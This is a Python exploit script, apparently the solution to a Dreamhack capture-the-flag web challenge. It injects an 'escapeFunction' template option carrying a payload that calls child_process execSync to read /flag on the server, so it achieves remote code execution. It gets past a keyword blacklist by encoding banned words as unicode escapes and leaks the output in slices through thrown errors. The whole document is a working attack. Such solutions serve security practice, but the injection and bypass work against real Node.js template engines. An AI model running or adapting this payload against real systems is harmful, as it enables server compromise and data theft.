import requests
import json

url = "http://host8.dreamhack.games:21866"

blacklist = ['require', 'readFileSync', 'mainModule', 'throw', 'fs', '+', 'flag', 'exec', 'concat', 'split', 'Object', '\', \\', '=>', '*', 'x', '()', 'global', 'return', 'str', 'constructor', 'eval', 'replace', 'from', 'char', 'catch']

def obf(s):
    return ''.join([f'\\\\u{hex(ord(c))[2:].zfill(4)}' for c in s])

flag = ""
limit = 35

while not flag.endswith("}"):
    idx = len(flag)

    payload = {
        'client': True,
        'escapeFunction': f"""1;eval(`throw "${{process.mainModule.require('child_process').execSync('cat /flag').slice({idx},{idx+limit})}}"`)"""
    }

    payload = json.dumps(payload)

    for banned in blacklist:
        if banned in payload:
            payload = payload.replace(banned, obf(banned))

    res = requests.get(url, params={ 'username': 'hi', 'settings': payload })
    flag += res.text

print("Flag:", flag)